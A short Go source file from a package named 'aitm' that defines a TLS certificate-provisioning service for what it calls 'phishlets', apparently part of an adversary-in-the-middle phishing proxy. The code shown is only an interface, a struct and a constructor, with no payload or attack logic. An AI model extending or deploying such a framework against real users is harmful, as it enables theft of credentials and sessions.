package aitm

import "crypto/tls"

// CertSource is the interface that cert implementations satisfy implicitly.
type CertSource interface {
	GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error)
}

// CertService manages TLS certificate provisioning for enabled phishlets.
type CertService struct {
	source CertSource
}

func NewCertService(source CertSource) *CertService {
	return &CertService{source: source}
}
